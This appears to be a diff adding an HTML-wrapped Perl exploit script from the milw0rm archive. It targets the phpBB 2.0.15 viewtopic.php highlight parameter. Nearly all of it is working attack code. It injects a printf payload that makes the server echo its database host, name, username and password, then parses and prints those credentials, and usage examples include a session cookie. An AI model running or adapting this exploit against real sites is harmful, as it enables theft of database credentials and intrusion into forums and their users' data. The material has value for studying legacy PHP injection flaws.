@@ -1,0 +1,135 @@
+<html><head><title>phpBB 2.0.15 (highlight) Database Authentication Details Exploit</title></head><pre>#!/usr/bin/perl
+
+# tested and working /str0ke
+
+#        ********************************************************************
+#       **********************************************************************
+#      ****                                                                 **
+#     ***      ******       *******************                             **
+#    ***    ***   ****   ***********************                            **
+#   ***   ***     ****                       ****      *   ***    *****     **
+#  ***   ***      ***                ***     ***      *  **  **   **        **
+# ***   ***                         ***      **         **   **  **         **
+#***   ***                          ***    ***          **   **  *****      **
+#**   ***                          ***  ****           **   **      **      **
+#**   ***       ***  ***   ******* *******             **  ***      **      **
+#**   ***      ***   ***  **      *** ***              **  **  **  **       **
+#**  ***      ***   ***  **      ***  ***               ***   *****         **
+#**   ***     ***   *** **       ***  ***                                   **
+#**   ****   ***    ****        ***   ***                                   **
+#**     *******    ****   ********     ***********************************  **
+#**         ***                                                             **
+#**        ***                                                              **
+#**                                                                         **
+#**      phpBB 2.0.15 Viewtopic.PHP Remote Code Execution Vulnerability     **
+#**      This exploit gives the user all the details about the database     **
+#**      connection such as database host, username, password and           **
+#**      database name.                                                     **
+#**                                                                         **
+#**              Written by SecureD,  gvr.secured&lt;AT&gt;gmail&lt;DOT&gt;com,2005     **
+#**                                                                         **
+#**      Greetings to GvR, Jumento, PP, CKrew &amp; friends      		        **
+#**                                                                         **
+#***************************************************************************** 
+# ***************************************************************************
+
+use IO::Socket;
+
+print &quot;+-----------------------------------------------------------------------+\r\n&quot;;
+print &quot;|           PhpBB 2.0.15 Database Authentication Details Exploit        |\r\n&quot;;
+print &quot;|                 By SecureD gvr.secured&lt;AT&gt;gmail&lt;DOT&gt;com               |\r\n&quot;;
+print &quot;+-----------------------------------------------------------------------+\r\n&quot;;
+
+if (@ARGV &lt; 3)
+{
+print &quot;Usage:\r\n&quot;;
+print &quot;phpbbSecureD.pl SERVER DIR THREADID COOKIESTRING\r\n\r\n&quot;;
+print &quot;SERVER         - Server where PhpBB is installed.\r\n&quot;;
+print &quot;DIR            - PHPBB directory or / for no directory.\r\n&quot;;
+print &quot;THREADID       - Id of an existing thread.\r\n&quot;;
+print &quot;COOKIESTRING   - Optional, cookie string of the http request.\r\n&quot;;
+print &quot;                 Use this when a thread needs authentication for viewing\r\n&quot;;
+print &quot;                 You can use Firefox in combination with \&quot;Live HTTP\r\n&quot;;
+print &quot;                 Headers\&quot; to get this cookiestring.\r\n\r\n&quot;;
+print &quot;Example 1 (with cookiestring):\r\n&quot;;
+print &quot;phpbbSecured.pl 192.168.168.123 /PHPBB/ 8 \&quot;phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=10dae92b780914332896df43808c4e09\&quot; \r\n\r\n&quot;;
+print &quot;Example 2 (without cookiestring):\r\n&quot;;
+print &quot;phpbbSecured.pl 192.168.168.123 /PHPBB/ 20 \r\n&quot;;
+exit();
+}
+
+$serv 		= $ARGV[0];
+$dir 		= $ARGV[1];
+$threadid 	= $ARGV[2];
+$cookie 	= $ARGV[3];
+
+$serv 		=~ s/http:\/\///ge;
+$delimit 	= &quot;GvRSecureD&quot;;
+
+$sploit	 = $dir . &quot;viewtopic.php?t=&quot;;
+$sploit .= $threadid;
+$sploit .= &quot;&amp;highlight='.printf($delimit.&quot;;
+$sploit .= &quot;\$dbhost.&quot;;
+$sploit .= &quot;$delimit.&quot;;
+$sploit .= &quot;\$dbname.&quot;;
+$sploit .= &quot;$delimit.&quot;;
+$sploit .= &quot;\$dbuser.&quot;;
+$sploit .= &quot;$delimit.&quot;;
+$sploit .= &quot;\$dbpasswd.&quot;;
+$sploit .= &quot;$delimit).'&quot;;
+
+$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
+
+print &quot;[+] Connecting      OK\n&quot;;
+sleep(1);
+
+print &quot;[+] Sending exploit &quot;;
+print $sock &quot;GET $sploit HTTP/1.1\r\n&quot;;
+print $sock &quot;Host: $serv\r\n&quot;;
+if ( defined $cookie) {
+	print $sock &quot;Cookie: $cookie \r\n&quot;;
+}
+print $sock &quot;Connection: close\r\n\r\n&quot;;
+
+
+$succes = 0;
+
+while ($answer = &lt;$sock&gt;) {
+	$delimitIndex = index $answer, $delimit;
+	if ($delimitIndex &gt;= 0) {
+		$succes = 1;
+		$urlIndex = index $answer, &quot;href&quot;;
+		if ($urlIndex &lt; 0){
+			$answer = substr($answer, length($delimit));
+			$length = 0;
+			while (length($answer) &gt; 0) {
+				$nex = index($answer, $delimit);
+				if ($nex &gt; 0) {
+					push(@array, substr($answer, 0, $nex));
+					$answer = substr($answer, $nex + length($delimit), length($answer));
+				} else {
+					$answer= &quot;&quot;;
+				}
+			}
+		}
+	}
+}
+
+close($sock);
+
+if ($succes == 1) {
+	print &quot;OK\n&quot;;
+	sleep(1);
+	print &quot;[+] Database Host:  &quot; . $array[0] . &quot;\n&quot;;
+	sleep(1);
+	print &quot;[+] Database Name:  &quot; . $array[1] . &quot;\n&quot;;
+	sleep(1);
+	print &quot;[+] Username:       &quot; . $array[2] . &quot;\n&quot;;
+	sleep(1);
+	print &quot;[+] Password:       &quot; . $array[3] . &quot;\n&quot;;
+	sleep(1);
+} else {
+	print &quot;FAILED\n&quot;;
+}
+
+# milw0rm.com [2005-07-03]</pre></html>
